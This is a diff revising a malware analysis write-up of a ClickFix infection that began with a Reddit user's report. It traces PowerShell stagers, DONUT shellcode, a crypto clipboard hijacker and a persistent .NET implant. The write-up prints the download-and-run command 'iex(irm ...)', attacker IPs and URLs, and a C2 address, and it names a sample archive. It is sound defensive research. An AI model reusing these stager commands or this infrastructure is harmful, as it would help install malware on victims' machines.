@@ -1,194 +1,211 @@
-
 Anatomy of a ClickFix Malware
-Reddit Case Study – Multi-Stage PowerShell → DONUT Loader → C# Compilation Chain
+Reddit Case Study – Multi-Stage PowerShell → DONUT Loader → .NET Implant
 
-------------------------------------------------------------
+====================================================================
 
 Initial Discovery
+====================================================================
 
 Source:
 https://www.reddit.com/r/antivirus/comments/1qy529j/very_tech_illiterate_very_paranoid_ran_a/
 
-The victim reported executing a PowerShell command obtained from a suspicious webpage.
+The victim executed a PowerShell command obtained from a suspicious webpage,
+triggering a multi-stage infection chain.
 
-------------------------------------------------------------
 
+====================================================================
 Stage 1 – Initial Execution
+====================================================================
 
 Command executed:
 
-powershell -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing) (01.txt)
+powershell -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing)
 
 Breakdown:
 - IEX → Invoke-Expression
 - IRM → Invoke-RestMethod
 
-This command downloads remote content from 158[.]94[.]209[.]33
-and immediately executes it in memory.
+This downloads remote content from:
 
-This is a classic fileless PowerShell staging technique.
+158[.]94[.]209[.]33
 
-------------------------------------------------------------
+and executes it directly in memory.
 
-Stage 2 – Secondary Payload (02.txt)
+Classic fileless PowerShell staging.
 
-The first script downloads a second PowerShell payload ,
-of which this line will be of interest:
 
-$finalPayload = iwr -Uri "178[.]16[.]53[.]70" -UseBasicParsing
+====================================================================
+Stage 2 – Secondary PowerShell Payload
+====================================================================
 
-- IWR → Invoke-WebRequest
-- Pulls the third stage from 178[.]16[.]53[.]70
+The first script retrieves a second PowerShell payload from:
 
-This confirms a multi-stage loader chain.
+178[.]16[.]53[.]70
 
-------------------------------------------------------------
+This confirms a structured multi-stage loader chain.
 
-Stage 3 – Shellcode Retrieval (cpatch.bin)
 
-The third stage retrieves:
+====================================================================
+Stage 3 – DONUT Shellcode (cptch.bin)
+====================================================================
 
-$u = "hxxp://94[.]154[.]35[.]115/user_profiles_photo/cptch[.]bin"
+The third stage downloads:
 
-Retrieved file:
+hxxp://94[.]154[.]35[.]115/user_profiles_photo/cptch[.]bin
+
+File:
 cptch.bin
 
-------------------------------------------------------------
+Identified via Detect It Easy (DIE) as:
 
-Shellcode Identification
+DONUT shellcode v0.9.2
 
-The binary was identified as DONUT shellcode (v0.9.2) using Detect it easy (DIE).
+Characteristics:
+- Position-independent shellcode
+- Converts PE (.NET/EXE/DLL) into in-memory loader
+- Starts with opcode 0xE8 (confirmed)
 
-DONUT is used to:
-- Convert PE files (.NET / EXE / DLL)
-- Into position-independent shellcode
-- For in-memory execution
+Static unpacking attempts failed.
 
-From DONUT 0.9.2 source code:
-The first byte of generated shellcode should be opcode 0xE8.
 
-This matched the retrieved sample.
+====================================================================
+Stage 4 – Secondary Payload Deployment
+====================================================================
 
-However:
-- Static unpacking attempts failed
-- UNDONUT only partially works
-- Significant changes occurred between versions 0.9.2 and 0.9.3
+cptch.bin performs the following actions:
 
-Payload extraction was unsuccessful at this stage.
+1) Downloads:
+   - cptchbuild.bin
+   - clipx64.bin
 
-------------------------------------------------------------
+2) Executes both payloads
 
-Dynamic Execution Attempt
+
+--------------------------------------------------------------------
+clipx64.bin
+--------------------------------------------------------------------
+
+- Native C++ executable
+- Identified as cryptocurrency clipboard hijacker
+- Intercepts and replaces wallet addresses
+
+
+--------------------------------------------------------------------
+cptchbuild.bin
+--------------------------------------------------------------------
+
+- Second DONUT shellcode
+- Builds a .NET executable in memory
+
+
+====================================================================
+Stage 5 – .NET Implant (file33.exe)
+====================================================================
+
+cptchbuild.bin builds and executes:
+
+file33.exe
+
+The .NET payload was dumped using ExtremeDumper.
 
 Observed behavior:
 
-load lotta DLL via import generated and retrieved using the function name hashed. -> No import in the import table 
-- better stealth 
+- Self-deletes after execution
+- Inserts persistence entry in registry
+- Establishes TCP connection to C2:
 
------------------------------------
-Analysis with long explanation + capture from IDA (prolly later) 
-------------------------------------------------------------
+  158.94.210.166 : 9993
 
+- Encrypts communication using AES-256
+- Performs anti-VM and anti-debug checks
 
-
-
-Additional Payloads Observed
-
-After execution, additional payloads were fetched:
-
-- **cptchbuild.bin** → secondary DONUT shellcode  
-- **clipx64.bin** → C++ compiled program  
-
----
-
-### cptchbuild.bin (Detected by DIE)
-
-![cptchbuild.bin](./cptch_build_die.png)
-
----
-
-### clipx64.bin (Detected by DIE)
-
-![clipx64.bin](./DIE_clipx64.bin.png)
-
-Quick virus total : 
-https://www.virustotal.com/gui/file/a609325c84a73341fea831ffdb3e29c8d9c1619eb09669cf489abdf9955b4dd6/ -> clipx64.bin -> 'The sample is a cryptocurrency clipboard hijacker designed to intercept and replace wallet addresses.' (from the virus total analyssi) 
-https://www.virustotal.com/gui/file/5788aabdff9e405ae8e4d1f16d34a78ebac955f9f3c52488dccc9e4e8c82ea22/ -> cptchbuild (another donut shellcode) 
-
-From:
-94[.]154[.]35[.]115
+Anti-analysis techniques observed:
+- Debug detection
+- Environment validation
+- Conditional execution safeguards
 
 
+====================================================================
+Dynamic Analysis Notes
+====================================================================
+
+The loader:
+
+- Dynamically resolves and loads numerous DLLs
+- Uses hashed function resolution
+- Avoids standard import table
+- Performs internet connectivity checks
+- Executes cmd.exe to validate network presence
+
+Process Monitor confirmed outbound network activity
+prior to full execution chain.
 
 
-From a pure analysis We'll first find where the dll are loaded 
-<img width="400" height="134" alt="DLL_LOADER" src="https://github.com/user-attachments/assets/6e73bae4-10a1-4b1e-897e-bab582a02aab" />
-
-We got that first function that each time is executed will load a DLL 
-We can also see it take a list of DLL name as argument in RBX 
-<img width="586" height="288" alt="argsrbx" src="https://github.com/user-attachments/assets/a77e40ef-6e3f-4efd-9a10-ce18fbb2416d" />
-, so let's disect it :
-we first find this string  <img width="458" height="318" alt="Inside_Func" src="https://github.com/user-attachments/assets/9ad08917-f154-482d-b030-9049a1fd1ebe" />
-which hint we are indeed in the part that add the .dll 
-a bit down further and we can see a call to this <img width="380" height="120" alt="bitdow" src="https://github.com/user-attachments/assets/c3e2c8b6-165d-4f01-987e-9e28b3950b0f" />
-but `qword [rsi+30h]` isnt anything like that 
-f7 to progress inside that function and it make more sense : 
-<img width="380" height="120" alt="bitdow" src="https://github.com/user-attachments/assets/29387977-a7bd-46e0-ae44-cc5589eb4ed4" />
-that's indeed a DLL_loader let's keep a breakpoint on it for now 
-
-Work it a bit further again and while procmon work behold 
- 
- <img width="969" height="74" alt="image" src="https://github.com/user-attachments/assets/560a491f-8655-453a-b9c9-b01241cf6194" />
-
- Someone tried to check if he had internet ;)
-  <img width="1352" height="123" alt="image" src="https://github.com/user-attachments/assets/ea82a0d0-6358-49df-a887-a00619325ef5" />
-
-  TO be fair , pressed f8 to run over the function that was the culprit so it ran without safeguard ... which is why i know up to the no internet what it does 
-  Now i'll go back to that function and dive in it 
-without skipping them we get down to 2 Function that do a LOT 
-<img width="415" height="247" alt="image" src="https://github.com/user-attachments/assets/9ea2a349-598e-4f80-9db2-00584dbbaa7a" />
-we got the first one that import about a LOT more dll 
-<img width="547" height="252" alt="image" src="https://github.com/user-attachments/assets/eaa1b71b-cbf7-4688-9074-fb60a0a94c31" />
-(that's about 1 / 4th) 
-BUT doesnt execute anything further the STOP_SKIPPING_ME function , call cmd.exe to ping 1.0.0.1 and close if there's no answers 
-
-From these we can supposse there's some .net in there based on clr.dll & mscore import so , let's see if we can find & extract it 
-
-
-once found -> 
-Got the .net , now ... <img width="784" height="210" alt="image" src="https://github.com/user-attachments/assets/b10ed23f-dc20-4fda-91d3-9b86bbd8598a" />
-
-MORE READING 
-
-------------------------------------------------------------
-
+====================================================================
 Infection Chain Summary
+====================================================================
 
-User runs PowerShell
+User executes PowerShell
         ↓
-Stage 1 loader (IEX + IRM)
+Stage 1 loader (fileless IEX + IRM)
         ↓
 Stage 2 PowerShell
         ↓
-Stage 3 downloads DONUT shellcode
+Stage 3 DONUT shellcode (cptch.bin)
         ↓
-Shellcode executes
+Downloads:
+    - cptchbuild.bin
+    - clipx64.bin
         ↓
-Download a secondaire Shellcode + Crypto hijacker 
+Executes both
         ↓
-Additional binaries fetched
+cptchbuild.bin builds .NET implant (file33.exe)
         ↓
-Unknown final C2
+file33.exe:
+    - Self deletes
+    - Writes registry persistence
+    - Connects to 158.94.210.166:9993
+    - Encrypts traffic via AES-256
+    - Performs anti-VM / anti-debug
+        ↓
+Final implant stage (analysis stopped here)
 
-------------------------------------------------------------
 
+====================================================================
+Artifacts
+====================================================================
+
+All recovered samples are included in:
+
+CLICKFIX.7z
+Password: infected
+
+Includes:
+- PowerShell stages
+- cptch.bin
+- cptchbuild.bin
+- clipx64.bin
+- Dumped .NET payload (file33.exe)
+
+
+====================================================================
 Conclusion
+====================================================================
 
-This case demonstrates:
-- Multi-stage fileless PowerShell
-- DONUT shellcode loader
-- On-the-fly C# compilation
-- Living-off-the-land via Microsoft tooling
+This campaign demonstrates:
 
-The final payload remains unidentified, but the execution chain
-strongly suggests a modular in-memory implant architecture.
+- Multi-stage fileless PowerShell execution
+- DONUT-based shellcode loaders
+- Dynamic API resolution via hashing
+- In-memory .NET implant construction
+- AES-256 encrypted C2 over TCP
+- Registry-based persistence
+- Cryptocurrency clipboard hijacking
+- Anti-VM and anti-debug techniques
+- Self-deleting payload behavior
+
+The structure indicates a modular loader framework designed
+for stealth and flexible payload deployment.
+
+Analysis was stopped after confirmation of encrypted C2
+communication and implant persistence behavior.
